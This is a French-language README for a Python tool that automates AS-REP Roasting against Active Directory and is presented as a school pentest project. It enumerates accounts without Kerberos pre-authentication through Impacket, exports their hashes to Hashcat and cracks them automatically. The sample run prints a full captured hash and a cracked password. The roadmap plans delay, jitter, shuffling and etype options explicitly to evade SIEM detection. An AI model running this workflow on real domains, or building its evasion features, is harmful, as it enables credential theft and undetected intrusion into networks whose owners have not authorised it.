# AS-Rep-Roaster

Outil Python d'audit Active Directory orienté AS-REP Roasting, conçu pour un usage pédagogique dans un environnement autorisé.

Ce projet automatise la détection de comptes Active Directory vulnérables à l'AS-REP Roasting (comptes avec la pré-authentification Kerberos désactivée), récupère les hashes exploitables via l'outil `impacket-GetNPUsers`, génère un rapport et un export compatible Hashcat, et peut lancer automatiquement le cassage des hashes via Hashcat.

---

## Contexte

L'AS-REP Roasting exploite une mauvaise configuration Active Directory : l'attribut `userAccountControl` d'un compte peut avoir le flag `DONT_REQ_PREAUTH` activé (option *"Do not require Kerberos preauthentication"*). Dans ce cas, n'importe quel utilisateur du réseau peut demander un ticket Kerberos (AS-REP) pour ce compte sans connaître son mot de passe. Une partie de la réponse est chiffrée avec la clé dérivée du mot de passe du compte, ce qui permet une attaque hors ligne par cassage de hash (brute-force / dictionnaire).

Ce projet s'appuie sur `impacket-GetNPUsers` (Fortra/Impacket) comme moteur d'énumération.

---

## Fonctionnalités

- Chargement d'une liste d'utilisateurs depuis un fichier texte
- Énumération contre un domaine Active Directory cible via `impacket-GetNPUsers`
- Détection des comptes ayant la pré-authentification Kerberos désactivée
- Parsing automatique des réponses AS-REP retournées
- Affichage clair des comptes roastables et non roastables
- Sélection interactive en terminal des comptes à exporter
- Génération d'un rapport texte final (`[ROASTABLE]` / `[X]` / `[CRACKED]`)
- Export séparé des hashes au format compatible Hashcat (mode **18200** pour etype 23)
- **Cracking automatique intégré** des hashes exportés via Hashcat, avec injection du mot de passe cassé directement dans le rapport

## Prérequis

- Python 3.10 ou supérieur
- [Impacket](https://github.com/fortra/impacket) installé avec le binaire `impacket-GetNPUsers` disponible dans le `PATH`
- [Hashcat](https://hashcat.net/hashcat/) installé et disponible dans le `PATH` (uniquement si l'option `--crack` est utilisée)
  
## Utilisation

```bash
python3 Roaster.py -h

usage: Roaster.py [-h] -u USERS -d DOMAIN -dc-ip DC_IP [-o OUTPUT] [--hashes HASHES]
[--crack] [--wordlist WORDLIST] [--rules RULES]
[--crack-timeout CRACK_TIMEOUT]

AS-REP Roasting Audit Tool (Lab)

options:
-h, --help show this help message and exit
-u, --users USERS File containing the list of users
-d, --domain DOMAIN Target domain (e.g. lab.local)
-dc-ip, --dc-ip DC_IP
Domain controller IP address
-o, --output OUTPUT Final report file
--hashes HASHES Hashcat-compatible export file (mode 18200)
--crack Automatically crack exported hashes with hashcat
--wordlist WORDLIST Wordlist path used for automatic cracking (default: /usr/share/wordlists/rockyou.txt)
--rules RULES Optional hashcat rules file (e.g. best64.rule)
--crack-timeout SECONDS Max seconds allowed for the cracking phase (default: 600)
```

## Exemple de sortie
```bash
┌─[eu-dedivip-1]─[10.10.X.X]─[ys4@ys4]─[~/AS-Rep-Roaster]
└──╼ [★]$ python3 Roaster.py -u users.txt --hashes hash.txt -dc-ip 10.129.95.180 -d domain.local --crack --wordlist /usr/share/wordlists/rockyou.txt
[*] Loading users from users.txt
[*] Enumerating against domain.local (10.129.95.180) using impacket-GetNPUsers...

--- Enum results ---
[0] fsmith - ROASTABLE

Enter the user numbers to export (separated by commas), or 'all' for all of them:
> 0
[*] Generating report to report.txt
[*] Exporting hashes to hash.txt
[*] Starting automatic cracking with wordlist: /usr/share/wordlists/rockyou.txt
[+] Done.

┌─[eu-dedivip-1]─[10.10.X.X]─[ys4@ys4]─[~/AS-Rep-Roaster]
└──╼ [★]$ cat hash.txt 
# Hashcat mode 18200
$krb5asrep$23$fsmith@domain.LOCAL:4e9f33ef4f5f040ecf277398105d5c1a$f89fc5137c5448f1f3028840d80a5c3fd5cf4a9f2bd6ff036d15935aeaff3ae7709a6bc0f8eff123e23bec91035d3f0a8fca025211bd3bb14b18d9f47a5c582563cadc99b47d1c55df1a562b938cfa513ca47909a99ca7f93b5440eeefa2ea96909b3261789fc5a90e8c3555d78cac4f3e6b8b3826cfd66c4f77e10e54063fde814fdbeb5e1969abecf07ee6e39446581c0233100ae2ebcca33b4936778d5d1a5aa6b18e56a32b81efcf1f9ef24aa4035d4cfb89df1a91b45ae01f28e5706e1596dc98628f8cce76baccc41840db730c94d313384837b1599c5bf05304b165a8c917f158727b6c56722ee1c5bd35964a15ddbf665f0e7a39210f8189881a64a2

┌─[eu-dedivip-1]─[10.10.X.X]─[ys4@ys4]─[~/AS-Rep-Roaster]
└──╼ [★]$ cat report.txt 
[X] testuser - No exploitable hash
[X] helloworld - No exploitable hash
[ROASTABLE] fsmith - $krb5asrep$23$fsmith@domain...

--- Cracked passwords ---
[CRACKED] fsmith : Thestrokes23
```

## Avertissement légal

Cet outil est fourni à des fins **strictement éducatives et pédagogiques**, dans le cadre d'un projet scolaire de cybersécurité offensive. Il ne doit être utilisé que contre :

- des environnements de lab que vous possédez ou que vous êtes explicitement autorisé à tester;
- des systèmes couverts par un accord de test d'intrusion en règle (scope + autorisation écrite).

Toute utilisation contre un système sans autorisation explicite est illégale et constitue une infraction pénale. L'auteur de ce projet ne pourra être tenu responsable d'un usage détourné de cet outil.


## Roadmap — Améliorations futures

### Discrétion accrue de l'énumération

- Ajouter des paramètres `--delay` et `--jitter` pour espacer aléatoirement les requêtes AS-REQ envoyées, réduisant le nombre d'événements Windows 4768 générés dans une fenêtre de temps courte.
- Introduire un mode `--batch-size` pour tester les utilisateurs par petits lots plutôt qu'en une seule vague, avec pause entre chaque lot.
- Supporter la randomisation de l'ordre des utilisateurs testés (`--shuffle`), pour casser la logique de scan séquentiel visible côté SIEM.
- Ajouter une option `--single-etype` pour ne demander qu'un seul type de chiffrement à la fois (au lieu de RC4 + AES en cascade), limitant la signature réseau de l'outil.
- Documenter dans le rapport final le nombre de requêtes envoyées et leur étalement temporel, pour illustrer pédagogiquement l'impact du delay/jitter sur la détectabilité.
